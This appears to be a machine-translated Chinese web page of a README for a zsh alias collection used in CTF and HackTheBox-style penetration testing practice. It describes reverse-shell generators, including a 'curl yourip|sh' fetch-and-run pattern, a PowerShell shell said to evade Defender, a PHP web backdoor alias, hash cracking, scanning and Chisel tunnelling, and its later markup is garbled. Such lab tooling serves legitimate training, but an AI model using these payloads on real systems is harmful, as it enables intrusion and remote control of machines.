@@ -1,0 +1,480 @@
+﻿<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>zsh-aliases - 别名和脚本，简化常见任务。</title>
+    <meta name="description" content="别名和脚本，简化常见任务。">
+    <meta name="keywords" content="zsh-aliases, Simplified Chinese, documentation, GitHub, open source">
+    <meta name="author" content="OpenAiTx">
+    <meta name="robots" content="index, follow">
+    
+    <!-- Structured Data -->
+    <script type="application/ld+json">
+    {
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "zsh-aliases",
+  "description": "别名和脚本，简化常见任务。",
+  "author": {
+    "@type": "Person",
+    "name": "jazzpizazz"
+  },
+  "applicationCategory": "DeveloperApplication",
+  "operatingSystem": "Any",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  },
+  "aggregateRating": {
+    "@type": "AggregateRating",
+    "ratingValue": "5",
+    "ratingCount": 176
+  },
+  "url": "https://OpenAiTx.github.io/projects/jazzpizazz/zsh-aliases/README-zh-CN.html",
+  "sameAs": "https://raw.githubusercontent.com/jazzpizazz/zsh-aliases/main/README.md",
+  "datePublished": "2026-05-07",
+  "dateModified": "2026-05-07"
+}
+    </script>
+    
+    <!-- GitHub-style CSS -->
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            line-height: 1.6;
+            color: #24292e;
+            background-color: #ffffff;
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .container {
+            background: #ffffff;
+            border: 1px solid #e1e4e8;
+            border-radius: 6px;
+            padding: 24px;
+            margin-bottom: 20px;
+        }
+        
+        .header {
+            border-bottom: 1px solid #e1e4e8;
+            padding-bottom: 16px;
+            margin-bottom: 24px;
+        }
+        
+        .project-title {
+            font-size: 2em;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .project-title a {
+            color: #24292e;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: color 0.2s ease;
+        }
+        
+        .project-title a:hover {
+            color: #0366d6;
+            text-decoration: none;
+        }
+        
+        .project-title .github-icon {
+            width: 1em;
+            height: 1em;
+            fill: currentColor;
+            opacity: 0.7;
+            transition: opacity 0.2s ease;
+        }
+        
+        .project-title a:hover .github-icon {
+            opacity: 1;
+        }
+        
+        .project-meta {
+            color: #586069;
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+        
+        .stars {
+            display: inline-block;
+            margin-right: 16px;
+        }
+        
+        .language {
+            display: inline-block;
+            background-color: #f1f8ff;
+            color: #0366d6;
+            padding: 2px 8px;
+            border-radius: 3px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        .content {
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        
+        h1, h2, h3, h4, h5, h6 {
+            margin-top: 24px;
+            margin-bottom: 16px;
+            font-weight: 600;
+            line-height: 1.25;
+            color: #24292e;
+        }
+        
+        h1 { font-size: 2em; border-bottom: 1px solid #eaecef; padding-bottom: 0.3em; }
+        h2 { font-size: 1.5em; border-bottom: 1px solid #eaecef; padding-bottom: 0.3em; }
+        h3 { font-size: 1.25em; }
+        
+        p {
+            margin-bottom: 16px;
+        }
+        
+        code {
+            background-color: #f6f8fa;
+            border-radius: 3px;
+            font-size: 85%;
+            margin: 0;
+            padding: 0.2em 0.4em;
+            font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
+        }
+        
+        pre {
+            background-color: #f6f8fa;
+            border-radius: 6px;
+            font-size: 85%;
+            line-height: 1.45;
+            overflow: auto;
+            padding: 16px;
+            margin-bottom: 16px;
+        }
+        
+        pre code {
+            background-color: transparent;
+            border: 0;
+            display: inline;
+            line-height: inherit;
+            margin: 0;
+            overflow: visible;
+            padding: 0;
+            word-wrap: normal;
+        }
+        
+        a {
+            color: #0366d6;
+            text-decoration: none;
+        }
+        
+        a:hover {
+            text-decoration: underline;
+        }
+        
+        ul, ol {
+            margin-bottom: 16px;
+            padding-left: 2em;
+        }
+        
+        li {
+            margin-bottom: 0.25em;
+        }
+        
+        blockquote {
+            border-left: 4px solid #dfe2e5;
+            color: #6a737d;
+            margin: 0 0 16px 0;
+            padding: 0 1em;
+        }
+        
+        .footer {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #e1e4e8;
+            color: #586069;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        .footer a {
+            color: #0366d6;
+        }
+        
+        .original-link {
+            margin-top: 16px;
+            padding: 12px;
+            background-color: #f6f8fa;
+            border-radius: 6px;
+            border: 1px solid #e1e4e8;
+        }
+        
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+            
+            .container {
+                padding: 16px;
+            }
+            
+            .project-title {
+                font-size: 1.5em;
+            }
+        }
+    </style>
+    
+    <!-- Prism.js for syntax highlighting -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+
+    <!-- Bing Count -->
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "sh95yd6uwt");
+    </script>        
+
+    <!-- Statcounter -->
+    <script type="text/javascript">
+        var sc_project = 13142514;
+        var sc_invisible = 1;
+        var sc_security = "d03a31d8"; 
+    </script>
+    <script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>
+    <noscript>
+        <div class="statcounter"><a title="Web Analytics" href="https://statcounter.com/" target="_blank"><img
+                    class="statcounter" src="https://c.statcounter.com/13142514/0/d03a31d8/1/" alt="Web Analytics"
+                    referrerPolicy="no-referrer-when-downgrade"></a></div>
+    </noscript>    
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1 class="project-title">
+                <a href="https://github.com/jazzpizazz/zsh-aliases" target="_blank" rel="noopener noreferrer">
+                    <svg class="github-icon" viewBox="0 0 16 16" aria-hidden="true">
+                        <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
+                    </svg>
+                    zsh-aliases
+                </a>
+            </h1>
+            <div class="project-meta">
+                <span class="stars">⭐ 176 stars</span>
+                <span class="language">Simplified Chinese</span>
+                <span>by jazzpizazz</span>
+            </div>
+        </div>
+        
+        <div class="content">
+            <h1>CTF、HTB、THM 等相关工具</h1>
+包含我常用的别名和脚本。只需将此仓库<strong>克隆到你的主目录</strong>，然后运行 <code>echo "source ~/zsh-aliases/aliases.zsh" >> ~/.zshrc</code>。重启 zsh 后，你应该可以使用所有别名和脚本。仅在 Kali Linux 上测试过，其他发行版可能需要安装额外的依赖。
+<blockquote>#### 免责声明</blockquote>
+<blockquote>这些别名大多数可能写得不太好，欢迎提交拉取请求减少“呆萌”程度。对我来说，只要能用就足够了 :D</blockquote>
+<h2>杂项</h2>
+<h3>> www</h3></p><p>在当前目录启动一个监听80端口的 HTTP 服务器。同时打印出每个网络接口关联的 IP 地址列表，显示当前目录路径并列出文件。
+示例：
+<pre><code class="language-">┌──(jazz㉿kali)-[/tmp/www]
+└─$ www
+[eth0] 192.168.172.128
+[/tmp/www]
+linpeas.sh  pspy64
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre>
+<blockquote>#### 注意事项</blockquote>
+<blockquote>- 使用 sudo 以确保能够监听端口 80</blockquote></p><h3>> tun0</h3></p><p>将 tun0 接口的 IP 地址复制到剪贴板。  
+示例：
+<pre><code class="language-">┌──(jazz㉿kali)-[~/jazz]
+└─$ tun0 </code></pre>
+剪贴板内容如下：
+<pre><code class="language-">10.10.14.41</code></pre></p><h3>> mkdir_cd</h3>
+通常在创建目录后，我希望直接进入该目录。这个命令正是实现了这一点。  
+示例： 
+<pre><code class="language-">┌──(jazz㉿kali)-[~/jazz]
+└─$ mkdir_cd pepega</p><p>┌──(jazz㉿kali)-[~/jazz/pepega]
+└─$ </code></pre></p><h2>反向Shell</h2>
+<h3>> gen_lin_rev $ip $port </h3>
+基于 <a href="https://github.com/lukechilds/reverse-shell" target="_blank" rel="noopener noreferrer">RSaaS</a>。在当前目录下创建一个名为 <code>index.html</code> 的文件。该文件包含多个反向Shell有效载荷，将依次尝试直到成功。可与 <code>www</code> 配合使用，使在获得RCE后生成反向Shell变得极其简单快捷。只需让目标执行 <code>curl yourip|sh</code>，即可从你的Web服务器获取反向Shell有效载荷，并-希望-连接回你的监听器。 
+示例：
+<pre><code class="language-">┌──(jazz㉿kali)-[~]
+└─$ gen_lin_rev 127.0.0.1 1337
+[+] Wrote Linux reverse shells to /home/jazz/index.html</code></pre>
+<blockquote>#### 备注</blockquote>
+<blockquote>- 我非常喜欢 <code>curl yourip|sh</code> 载荷几乎没有坏字符，除了可能的空格和管道符。当空格成为问题时，有<a href="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-forbidden-spaces" target="_blank" rel="noopener noreferrer">解决方法</a>，管道符可以通过先下载再单独执行来绕过。</blockquote>
+<blockquote>- 如果远程机器未安装 curl，可以尝试 <code>wget yourip -O-|sh</code></blockquote>
+ 
+<h3>> gen_php_rev $ip $port</h3></p><p>生成带有提供的 ip 和端口的 <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank" rel="noopener noreferrer">PentestMonkey PHP 反向 Shell</a>，并保存在当前目录中。  
+示例：</p><pre><code class="language-">┌──(jazz㉿kali)-[~]
+└─$ gen_php_rev 127.0.0.1 1337                                                              
+[+] Wrote PHP reverse shell to /home/jazz/jazz.php</code></pre>
+<h3>> gen_ps_rev $ip $port</h3>
+生成一个使用提供的ip和端口的Powershell反向Shell，截至上次使用时能够绕过Defender。我不确定该给谁归功于这个有效载荷。 
+示例：
+<pre><code class="language-">┌──(jazz㉿kali)-[~]
+└─$ gen_ps_rev 127.0.0.1 1337</code></pre>
+剪贴板内容之后：
+<pre><code class="language-">powershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0A...</code></pre></p><h2>TTY 升级</h2>
+<h3>> uptty</h3>
+将 python(2) 和 python3 的 tty 升级命令复制到剪贴板。
+示例：
+<pre><code class="language-">┌──(jazz㉿kali)-[~/jazz]
+└─$ uptty</code></pre>
+剪贴板内容如下：
+<pre><code class="language-">python3 -c 'import pty;pty.spawn("/bin/bash")';python -c 'import pty;pty.spawn("/bin/bash")'</code></pre>
+<blockquote>#### 注意事项</blockquote>
+<blockquote>- 需要安装 <code>xclip</code></blockquote>
+<blockquote>- 目前仍包含 <code>py_tty_upgrade</code> 和 <code>py3_tty_upgrade</code>，但将调用此别名</blockquote></p><h3>> script_tty_upgrade</h3>
+当远程机器未安装 Python 时，可以使用此命令将升级到 tty shell 的 <code>script</code> 方法复制到剪贴板。 
+示例：
+<pre><code class="language-">┌──(jazz㉿kali)-[~/jazz]
+└─$ script_tty_upgrade</code></pre>
+剪贴板内容之后：
+<pre><code class="language-">/usr/bin/script -qc /bin/bash /dev/null</code></pre>
+<blockquote>#### 注意事项</blockquote>
+<blockquote>- 需要安装 <code>xclip</code></blockquote></p><h3>> tty_fix</h3>
+运行 <code>stty raw -echo; fg; reset</code>，应在使用上述 tty 升级之一后使用。</p><h3>> tty_conf</h3>
+获取当前 tty 设置（行数和列数），并将一行命令复制到剪贴板，可以直接粘贴到你的反向 shell 窗口，使设置匹配。这解决了终端中途换行的问题。  
+示例：
+<pre><code class="language-">┌──(jazz㉿kali)-[~/jazz]
+└─$ tty_conf               </code></pre>
+剪贴板内容如下：
+<pre><code class="language-">stty rows 30 columns 116</code></pre>
+<blockquote>#### 备注</blockquote>
+<blockquote>- 需要安装 <code>xclip</code></blockquote></p><h2>破解哈希</h2>
+<h3>> rock_john $hash_file（额外参数）</h3>
+这个别名会注入 <code>--wordlist=/usr/share/wordlists/rockyou.txt</code> 参数，而不是手动输入（没有自动补全 :/），因此可以更方便地使用 JohnTheRipper 和 rockyou 字典尝试破解哈希。
+示例：
+<pre><code class="language-">┌──(jazz㉿kali)-[~/jazz]
+└─$ rock_john hash.txt --format=Raw-MD5
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+jazz             (?)     
+1g 0:00:00:00 DONE (2022-05-19 15:59) 100.0g/s 5376Kp/s 5376Kc/s 5376KC/s lynn88..ilovebrooke
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.</code></pre>
+<blockquote>#### 备注</blockquote>
+<blockquote>- Kali 似乎在 2022.2 版本中修复了 John 的自动补全！不过这个别名仍然能帮你省点力 ;)</blockquote>
+<h2>端口扫描</h2>
+<h3>> nmap_tcp $ip（额外参数）</h3>
+使用我的默认设置启动 TCP nmap 扫描，并将扫描结果输出到一个 nmap 目录，如果该目录尚不存在则会自动创建。
+示例：
+<pre><code class="language-">┌──(jazz㉿kali)-[~]
+└─$ nmap_default 127.0.0.1
+[i] Creating /home/jazz/nmap...
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:04 EDT
+...</code></pre>
+<blockquote>#### 备注</blockquote>
+<blockquote>- 这只扫描默认的 TCP 端口。添加 <code>-p-</code> 参数以扫描所有端口。</blockquote>
+<blockquote>- 使用 <code>sudo</code> 获取执行 SYN 扫描所需的权限</blockquote>
+<h3>> nmap_udp $ip（额外参数）</h3>
+使用我的默认设置启动 UDP nmap 扫描，并将扫描结果输出到一个 nmap 目录，如果该目录尚不存在会自动创建。
+示例：
+<pre><code class="language-">┌──(jazz㉿kali)-[~]
+└─$ nmap_udp 127.0.0.1
+[i] Creating /home/jazz/nmap...
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 16:11 EDT
+...</code></pre>
+<blockquote>#### 注意事项</blockquote>
+<blockquote>- 这只扫描默认的 UDP 端口。添加 <code>-p-</code> 参数可以扫描所有端口。</blockquote>
+<blockquote>- 使用 <code>sudo</code> 获取执行 UDP 扫描所需的权限</blockquote></p><h2>SecLists 路径</h2></p><blockquote>#### 注意事项</blockquote>
+<blockquote>- 该工具包中的许多功能使用 SecLists 项目的字典列表。为了确保这些功能正常工作，脚本需要知道 SecLists 目录的位置。工具包使用以下逻辑定位 SecLists：</blockquote></p><ul><li>首先检查 <code>/opt/seclists/</code> 是否存在。</li>
+<li>如果不存在，则检查 <code>/usr/share/seclists/</code> 是否存在。</li>
+<li>如果这两个目录都不存在，则查找名为 <code>SECLISTS_PATH</code> 的环境变量。</li></p><p></ul>要设置 SecLists 以供这些脚本使用：</p><ul><li>在标准位置之一安装 SecLists（<code>/opt/seclists/</code> 或 <code>/usr/share/seclists/</code>）。</li>
+   
+   </ul>或</p><ul><li>设置 <code>SECLISTS_PATH</code> 环境变量指向你的 SecLists 安装路径：</li></p><p>   </ul><pre><code class="language-bash">   export SECLISTS_PATH="/path/to/seclists"
+   # You can add this line to your .zshrc file to make it permanent.
+    ``<code></p><h2>网站模糊测试</h2>
+<h3>> vhost $domain (-w 词表)（额外参数）</h3>
+使用 ffuf 执行虚拟主机发现。
+示例：</code></pre>
+┌──(22sh㉿kali)-[~]
+└─$ vhost box.htb
+<pre><code class="language-">> #### 注意事项
+<blockquote>- 当只传递域名时，将使用 http，但你也可以传入完整的 url，如 https://box.htb 来使用 https</blockquote>
+<blockquote>- 需要安装 </code>ffuf<code></blockquote>
+<h3>> fuzz_dir $url（额外参数）</h3>
+使用 ffuf 进行目录和文件模糊测试。
+示例：</code></pre>
+┌──(22sh㉿kali)-[~]
+└─$ fuzz_dir http://box.htb</p><p>┌──(22sh㉿kali)-[~]
+└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt</p><p>┌──(22sh㉿kali)-[~]
+└─$ fuzz_dir http://box.htb -fs 245</p><p>┌──(22sh㉿kali)-[~]
+└─$ fuzz_dir http://box.htb -w /path/to/custom/wordlist.txt -fs 245
+<pre><code class="language-">> #### 注意事项
+<blockquote>- 需要安装 </code>ffuf<code></blockquote>
+<h2>Chisel 隧道</h2>
+<h3>> chisel_socks $ip $port</h3>
+使用 Chisel 设置 SOCKS 代理并将命令复制到剪贴板。
+示例：
+</code></pre>
+┌──(22sh㉿kali)-[~/jazz]
+└─$ chisel_socks 10.10.14.10 8888
+[+] copied chisel client -v 10.10.14.10:8888 R:socks in clipboard
+2024/08/05 23:31:03 server: Reverse tunnelling enabled
+2024/08/05 23:31:03 server: Fingerprint vasHkxo+4Ec2ahPgyQ8BNqQVXOCda9cmPmP7WXRdh44=
+2024/08/05 23:31:03 server: Listening on http://0.0.0.0:8888
+<pre><code class="language-">### > chisel_forward $local_ip $local_port $remote_ip $remote_port
+使用 Chisel 设置端口转发。
+示例：
+</code></pre>
+┌──(22sh㉿kali)-[~/jazz]
+└─$ chisel_forward 10.10.14.10 8080 127.0.0.1 8080
+[+] Copied to clipboard: ./chisel client 10.10.14.10:8888 R:8080:127.0.0.1:8080
+[+] Run this on the target machine
+2024/08/05 23:32:30 server: Reverse tunnelling enabled
+2024/08/05 23:32:30 server: Fingerprint x2iuHfzYVOWXL/7Gw0a6AjXhMIg8WP7AqZwlDuRasQw=
+2024/08/05 23:32:30 server: Listening on http://0.0.0.0:8888
+<pre><code class="language-">## 主机管理
+<h3>> addhost $ip $hostname</h3>
+在 /etc/hosts 文件中添加或更新条目。
+示例：</code></pre>
+┌──(22sh㉿kali)-[~/jazz]
+└─$ addhost 10.10.11.234 big.box.htb 
+[+] Appended big.box.htb to existing entry for 10.10.11.234 in /etc/hosts
+10.10.11.234 boss.htb big.boss.htb big.box.htb</p><p>
+┌──(22sh㉿kali)-[~/jazz]
+└─$ addhost 10.10.11.235 newbox.htb 
+[+] Added new entry: 10.10.11.235 newbox.htb to /etc/hosts
+10.10.11.235 newbox.htb
+</code>`<code>
+<h2>额外别名</h2>
+<ul><li></code>linpeas<code>：下载最新版本的 LinPEAS。</li>
+<li></code>upload<code>：使用 bashupload.com 上传文件。</li>
+<li></code>phpcmd<code>：创建一个简单的 PHP 网络后门。</li>
+<li></code>burl`：使用 burpsuite 代理的 curl。</li></p><p>
+
+</ul>---
+
+Tranlated By <a href="https://github.com/OpenAiTx/OpenAiTx" target="_blank" rel="noopener noreferrer">Open Ai Tx</a> | Last indexed: 2026-05-07
+
+---</p>
+        </div>
+        
+        <div class="original-link">
+            <strong>Original README:</strong> <a href="https://raw.githubusercontent.com/jazzpizazz/zsh-aliases/main/README.md" target="_blank" rel="noopener noreferrer">View on GitHub</a>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <p>Translated by <a href="https://github.com/OpenAiTx/OpenAiTx" target="_blank" rel="noopener noreferrer">OpenAiTx</a> | 
+        Last updated: 2026-05-07 
+    </div>
+    
+</body>
+</html>
